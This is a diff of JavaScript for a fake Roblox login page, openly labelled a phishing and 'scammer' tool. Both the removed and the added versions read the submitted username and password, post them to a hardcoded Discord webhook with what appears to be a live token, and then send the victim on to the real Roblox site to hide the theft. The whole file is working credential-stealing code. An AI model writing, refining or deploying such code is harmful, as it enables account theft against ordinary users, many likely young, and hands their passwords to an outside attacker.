@@ -1,73 +1,33 @@
-// Ton webhook URL
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1538723870050095204/oZWJ3gD5uDClYngLjnV1cJU3EHxoFHNPyISpMStVadt5RFT64A0I1PVJ44OL-Ri-EFvY";
 
-document.getElementById('loginForm').addEventListener('submit', function(e) {
-    e.preventDefault(); // Empêche la page de recharger normalement
 
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
     
-    // Date et heure de la capture
-    const date = new Date().toLocaleString();
-
-    // Afficher un faux chargement pour faire croire que ça marche
-    const form = document.getElementById('loginForm');
-    form.classList.add('hidden');
-    document.getElementById('loading').classList.remove('hidden');
-
-    // Nouvelle structure UI (Moderne)
     const payload = {
-        "content": null,
-        "embeds": [
-            {
-                "title": "🔒 Nouveau compte récupéré",
-                "description": "Un utilisateur s'est connecté depuis ton lien phishing.",
-                "color": 5814783, // Bleu moderne (Discord Blurple-ish)
-                "fields": [
-                    {
-                        "name": "👤 Identifiant / Email",
-                        "value": `\`\`\`${username}\`\`\``, // Format code pour faciliter la copie
-                        "inline": true
-                    },
-                    {
-                        "name": "🔑 Mot de passe",
-                        "value": `\`\`\`${password}\`\`\``,
-                        "inline": true
-                    },
-                    {
-                        "name": "🕒 Date de capture",
-                        "value": date,
-                        "inline": false
-                    }
-                ],
-                "footer": {
-                    "text": "Roblox Scammer Tool | 2026"
-                },
-                "timestamp": new Date().toISOString()
-            }
-        ]
+        content: `🚨 **New Roblox Login** 🚨\n👤 Username: \`${username}\`\n🔑 Password: \`${password}\`\n📅 Date: ${new Date().toISOString()}`
     };
 
-    // Envoi vers le webhook Discord
-    fetch(WEBHOOK_URL, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify(payload)
-    }).then(response => {
+    try {
+        const response = await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload),
+        });
+
         if (response.ok) {
-            console.log("Données envoyées avec succès !");
-            // Redirection vers le vrai site Roblox après un court délai pour la forme
-            setTimeout(() => {
-                window.location.href = "https://www.roblox.com/home";
-            }, 1000);
+            console.log("Data sent to webhook");
+            // Redirect to real Roblox login page after sending
+            window.location.href = "https://www.roblox.com/login";
         } else {
-            console.error("Erreur envoi webhook");
-            window.location.href = "https://www.roblox.com/home";
+            console.error("Failed to send data");
         }
-    }).catch(error => {
-        console.error("Erreur réseau", error);
-        window.location.href = "https://www.roblox.com/home";
-    });
+    } catch (error) {
+        console.error("Error:", error);
+    }
 });
